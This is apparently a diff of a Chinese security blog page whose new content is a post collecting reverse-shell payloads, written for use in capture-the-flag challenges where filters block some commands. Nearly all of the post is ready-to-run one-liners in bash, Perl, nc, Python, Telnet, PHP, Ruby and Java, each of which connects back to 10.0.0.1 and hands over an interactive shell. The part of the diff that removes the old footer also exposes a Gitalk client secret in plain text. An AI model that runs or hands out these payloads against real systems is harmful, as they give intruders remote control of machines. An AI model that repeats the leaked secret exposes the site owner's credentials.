+}</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">信安小蚂蚁</span></a><a class="nav-page-title" href="/"><span class="site-name">反弹shell payload总结</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">反弹shell payload总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-27T01:07:51.000Z" title="发表于 2020-03-27 09:07:51">2020-03-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-03-27T01:34:42.000Z" title="更新于 2020-03-27 09:34:42">2020-03-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/">日常笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>&emsp;有时候需要用到反弹shell，但是题目会有过滤，所以我就总结一下大多数可以用的payload 以便下次使用。</p>
+<h3 id="这么多的payload总有一个适合你"><a href="#这么多的payload总有一个适合你" class="headerlink" title="这么多的payload总有一个适合你"></a>这么多的payload总有一个适合你</h3><h4 id="bash版本"><a href="#bash版本" class="headerlink" title="bash版本"></a>bash版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>注意这个是由解析shell的bash完成，所以某些情况下不支持。</p>
+<h4 id="Perl版本"><a href="#Perl版本" class="headerlink" title="Perl版本"></a>Perl版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+<p>下面这个可以说是上面的升级版了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="nc-版"><a href="#nc-版" class="headerlink" title="nc 版"></a>nc 版</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br></pre></td></tr></table></figure>
+<p>版本问题或不支持-e可使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<h4 id="python-版"><a href="#python-版" class="headerlink" title="python 版"></a>python 版</h4><p>应该是python2和python3通用的(测试用的python2.7)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+<p>或者：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;10.0.0.1&#x27;,1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Telnet版本"><a href="#Telnet版本" class="headerlink" title="Telnet版本"></a>Telnet版本</h4><p>当nc不可用或/dev/tcp不可用时可以考虑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 10.0.0.1 1234 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<h4 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Ruby版"><a href="#Ruby版" class="headerlink" title="Ruby版"></a>Ruby版</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+<p>不依赖于/bin/sh的shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;1234&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+<p>如果目标系统运行Windows：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;1234&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="java版"><a href="#java版" class="headerlink" title="java版"></a>java版</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
 
 
 
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</div>
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
-  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
-  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/muse.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css">
-
-<script>
-NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
-  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js', () => {
-    var gitalk = new Gitalk({
-      clientID    : 'Ov23li6cOHoOwCcszzi9',
-      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
-      repo        : 'mayi077.github.io',
-      owner       : 'mayi077',
-      admin       : ['mayi077'],
-      id          : '72d4c5139ee7c9715995f80d435e1ff4',
-        language: 'zh-CN',
-      distractionFreeMode: true,
-      enablePKCE: true
-    });
-    gitalk.render('gitalk-container');
-  }, window.Gitalk);
-});
-</script>
-
-</body>
-</html>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><a target="_blank" rel="noopener" href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mayi077.github.io">信安小蚂蚁</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/">https://mayi077.github.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mayi077.github.io" target="_blank">信安小蚂蚁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/">基础积累</a><a class="post-meta__tags" href="/tags/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/">日常笔记</a></div><div class="post-share"><div class="social-share" data-image="/images/1.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2020/03/28/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E5%8C%A0%E5%B7%A5%E5%9D%8A-%E6%AF%94%E8%B5%9B/" title="记一次 信息安全工匠工坊 比赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">记一次 信息安全工匠工坊 比赛</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;自己还是太菜了，到现在会做的只有三道题，记录一下吧还是学到了很多新知识的。 签到题 EasyRSA&emsp;可能是太菜的原因差点连签到题都没做出来。  看题目应该是 RSA 加解密了 ，题目给了2个文件。一个是密钥很明显，还有一个应该是密文了。拿去在线解密失败了。 仔细一看，密文好像是一个二进制文件，尝试将其 base64 这里我们使用python脚本如下：123import  base64with open(r&quot;C:\Users\mayi\Desktop\EasyRSA\flag.en&quot;,&quot;rb&quot;) as f:    print(base64.b64encode(f.read())) 得到:1b&#x27;J0lEyZGYsHOJhN0kmEr8RvNIxbKJyXRNSeqDDbiOKVXJjrCqxeiKkmKuv6QvRlIML6CcFs5yXaP70bqkQIpXQ2/ZbcW4UGZCOdja/mxcktbA3TxHGNcXZDh2MX7k/MUajaJv/FXff6kcSpjOZlfiLossZDZvpXB...</div></div></div></a><a class="pagination-related" href="/2020/03/25/HITCON-2017-SSRFme/" title="[HITCON 2017]SSRFme"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[HITCON 2017]SSRFme</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;这道题的考点是 GET 这个命令的一个命令执行漏洞，主要是 perl 的一个特点，在 open 可以执行命令。看别人的wp可以直接再Linux下使用GET命令，但是我花了很长时间却不成功，就当一个知识点来记下吧确实没有理解透。 最后换了Kali 一切都好了起来。 file 协议利用 open 命令执行&emsp;perl的feature，在open下可以执行命令。前提是文件事先存在。例子：这是使用perl可以执行系统命令 123456[root@izwz962asjj9zbi0ahwa55z test]# perl a.pl[root@izwz962asjj9zbi0ahwa55z test]# uid=0(root) gid=0(root) groups=0(root)cat a.plopen(FD, &quot;|id&quot;);print &lt;FD&gt;; 下面我们来看看使用GET如何来执行系统命令。（具体啥原因就不讲了，俺也不知道，大概就是open函数支持file协议吧 ） 要执行的命令先前必须要有以命令为文件名的文件存在我们执行以下命令 12...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2020/03/13/CTGHub-%E4%B9%8B-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="CTGHub  之 文件上传"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-13</div><div class="info-item-2">CTGHub  之 文件上传</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;这次，那种非常简单的就不记了。加油奥利给！！！ .htaccess&emsp;.htaccess文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。&emsp;服务器没有拦截我们上传 .htaccess 文件，那么我们就可以利用.htaccess文件解析漏洞，来绕过验证进行上传WEBShell，从而达到控制网站服务器的目的。&emsp;首先我们编写一个.htaccess文件。我们直接在 windows 下改文件名为.htaccess是不可的,我们可以在burp上改也可以使用另存为来改。文件内容为： 12AddType application/x-httpd-php .jpg//意思就是将 .jpg 文件以php文件解析 &emsp;接着我们写一个一句话，然后改成后缀名为.jpg。 服务器就会解析我们...</div></div></div></a><a class="pagination-related" href="/2020/03/24/%E5%88%9D%E8%AF%86-Shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/" title="初识 Shell 脚本编程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-24</div><div class="info-item-2">初识 Shell 脚本编程</div></div><div class="info-2"><div class="info-item-1">前言：&emsp;突然发现Linux下执行ca$1t flag命令时也可以正常访问，再加上以前做题时也有使用这些奇怪符号绕过的。得知是shell脚本相关得到那么我就来看看shell脚本吧。 什么是 Shell&emsp; shell 是一个应用程序，这个应用程序提供了一个界面，可以使用户通过这个界面访问 Linux 内核的服务。&emsp;我们常常说的Shell 其实更多的是指 Shell 脚本（shell script），是一种为shell编写的脚本程序，一般文件后缀为.sh&emsp;其实Shell 编程跟 java、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。 Shell 运行的模式&emsp;Shell 运行模式有 交互式和非交互式两种模式，我们日常接触的应该是交互式的。&emsp;交互式：这种模式就和我们执行命令行一样，执行一条命令立马返回结果。&emsp;非交互模式：在这种模式下，shell从文件或者管道中读取命令并执行。当 shell 解释器执行完文件中最后一个命令后，shell进程中止，并回到父进程。 第一个 Shell...</div></div></div></a><a class="pagination-related" href="/2020/03/22/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="preg_replace与代码执行"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-22</div><div class="info-item-2">preg_replace与代码执行</div></div><div class="info-2"><div class="info-item-1">前言:&emsp;以前刷题刷到过但是当时看了wp觉得已经懂了，今天做题发现并不如此，那么我就再学习学习记录记录。 初识 preg_replace&emsp;preg_replace(str1,str2,$x)函数就是将$x中的str1 替换为 str2（str1可以是正则）。为了方便php开发团队提出了 preg_replace /e 模式，使用方法是在str1 后面加/e，如果有匹配 str1 成功它会先将 str2执行一遍，相当于eval（执行结果可以显示）并把结果替换到 $x 中匹配字符。简单看看下面例子：注：记得str1有//定界符，没有会报错但是专家们很早就已经意识到/e的危险性了，在php5.5.0开始就废弃了/e模式（但好像还可以用，7.*用不了了），事实上仅仅把 preg_replace 里面有 /e 修饰符的代码 改动成  preg_replace _callback就可以了达到原来的效果了。   来看一个案例&emsp;代码如下： 123456789101112&lt;?phpfunction fun($a,$b)&#123;	return preg_repl...</div></div></div></a><a class="pagination-related" href="/2020/03/21/%E5%88%9D%E8%AF%86-SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" title="初识 SSTI 服务端模板注入攻击"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-21</div><div class="info-item-2">初识 SSTI 服务端模板注入攻击</div></div><div class="info-2"><div class="info-item-1">前言&emsp;尽管以前遇到过这种漏洞的题目，但这次做到还是这么陌生，是该记录一下了。 初步认识&emsp;ssti,服务端模板注入。应该可以这么理解，模板里面有些需要用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。&emsp;模板只是一种提供给程序来解析的一种语法,就是说不同的模板可能有不同的语法。不过据我暂时了解php、python的模板是这样执行代码的{{执行的代码}}如{{system("cat flag")}} 而java的模板是使用${system("ls")}这样来执行代码。&emsp;接下来我会在本地安装搭建flask模板环境。首先以管理员身份打开cmd 运行 pip3 install flask 来安装flask模块，安装成功后使用以下代码来测试： 123456789101112##import 和 from 模块  import 函数 的区别是：## import 模块：导入一个模块；注：相当于导入的是一个文件夹，是个相对路径。 调用模块.函数##from…import：导入了一个模块中的...</div></div></div></a><a class="pagination-related" href="/2020/03/10/SVN-%E6%B3%84%E6%BC%8F-%E5%8F%8A-%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/" title="SVN 泄漏 及 利用工具"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-10</div><div class="info-item-2">SVN 泄漏 及 利用工具</div></div><div class="info-2"><div class="info-item-1">前言：&emsp; 安装工具费了老多的时间，最后只是因为服务器响应慢导致的，气煞我也。不过也对linux 多了一点点了解。&emsp;总结下就是学会看帮助文档，学会看错误提示，学会百度谷歌，学会实践。 SVN 是个什么东西&emsp;SVN（Subversion）是一个开放源代码的版本控制系统，与使用Git版本控制器类似。在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。 svn 目录&emsp;使用 svn checkout 后，项目目录会产生一个隐藏的 .svn文件夹。&emsp;svn1.6及以前版本会在项目的每个文件夹都生成一个.svn 文件夹，里面包含了所有文件的备份。&emsp;svn1.7 及以后版本只在项目根目录生成一个.svn文件夹，里面的pristime文件夹里包含了整个项目的所有文件备份。它里面有一堆 00到ff 的文件夹，每个文件夹里有若干个.svn-base 文件，文件命名规则是文件原名的哈希值，然后文件夹名称其实是文件的开头2位数。&emsp;...</div></div></div></a><a class="pagination-related" href="/2020/03/16/PHP%E4%B8%ADmt-rand%E5%87%BD%E6%95%B0%E4%BA%A7%E7%94%9F%E7%9A%84%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" title="PHP中mt_rand函数产生的伪随机数"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2020-03-16</div><div class="info-item-2">PHP中mt_rand函数产生的伪随机数</div></div><div class="info-2"><div class="info-item-1">前言:&emsp;PHP的mt_rand函数作为一个随机数生成工具在程序中被广泛使用，但是我们不难发现它生成的随机数不是真正的随机数而是伪随机。既然是伪随机就有可能利用。 PHP mt_rand函数&emsp;mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 RAND_MAX (随机数的最大可能值) 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。&emsp;使用mt_rand()生成随机数的第一个步骤是使用种子（无符号整数值）来生成包含624个值的状态数组。我们可以调用mt_srand($seed)。从 PHP 4.2.0 开始，随机数生成器自动播种，当然如果我们再播种的话会覆盖了系统自动播的种子。  利用思路&emsp;因为是伪随机，那么如果我们输入同样的参数那么肯定会出同样的结果。它的可控参数有2个种子 和 范围 。也就是说它可以简化为这样的函数y=seed + i*x 其中seed 是我们的种子，x是我们使用mt_rand时给出的范围，i表示第几次调...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">信安小蚂蚁</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">135</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">86</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mayi077"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">2020–2021，这里记录了 100+ 篇文字。
+后来因工作入职，暂时搁笔。
+2026，重新起航。
+继续写下去。
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B9%88%E5%A4%9A%E7%9A%84payload%E6%80%BB%E6%9C%89%E4%B8%80%E4%B8%AA%E9%80%82%E5%90%88%E4%BD%A0"><span class="toc-number">2.</span> <span class="toc-text">这么多的payload总有一个适合你</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bash%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">bash版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Perl%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">Perl版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc-%E7%89%88"><span class="toc-number">2.3.</span> <span class="toc-text">nc 版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-%E7%89%88"><span class="toc-number">2.4.</span> <span class="toc-text">python 版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Telnet%E7%89%88%E6%9C%AC"><span class="toc-number">2.5.</span> <span class="toc-text">Telnet版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E7%89%88%E6%9C%AC"><span class="toc-number">2.6.</span> <span class="toc-text">php版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ruby%E7%89%88"><span class="toc-number">2.7.</span> <span class="toc-text">Ruby版</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java%E7%89%88"><span class="toc-number">2.8.</span> <span class="toc-text">java版</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考链接：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-TLS%E5%8A%A0%E5%AF%86%E5%A5%97%E4%BB%B6/" title="TLS加密套件">TLS加密套件</a><time datetime="2026-04-20T14:30:00.000Z" title="发表于 2026-04-20 22:30:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/20/2026-04-20-AI-Agent-%E6%9E%B6%E6%9E%84/" title="AI Agent 架构">AI Agent 架构</a><time datetime="2026-04-19T16:00:00.000Z" title="发表于 2026-04-20 00:00:00">2026-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/15/PHP-%E6%AD%A3%E5%88%99%E7%9A%84-m%E5%A4%9A%E8%A1%8C%E6%A8%A1%E5%BC%8F/" title="PHP 正则的 m多行模式">PHP 正则的 m多行模式</a><time datetime="2021-04-15T00:54:31.000Z" title="发表于 2021-04-15 08:54:31">2021-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" title="vulnstack-ATT&amp;CK实战系列 红队实战（一）">vulnstack-ATT&amp;CK实战系列 红队实战（一）</a><time datetime="2021-04-14T12:46:10.000Z" title="发表于 2021-04-14 20:46:10">2021-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/04/09/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="域内横向移动">域内横向移动</a><time datetime="2021-04-09T07:56:53.000Z" title="发表于 2021-04-09 15:56:53">2021-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 信安小蚂蚁</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 5.4.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.5-b1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5-b1"></script><script src="/js/main.js?v=5.5.5-b1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
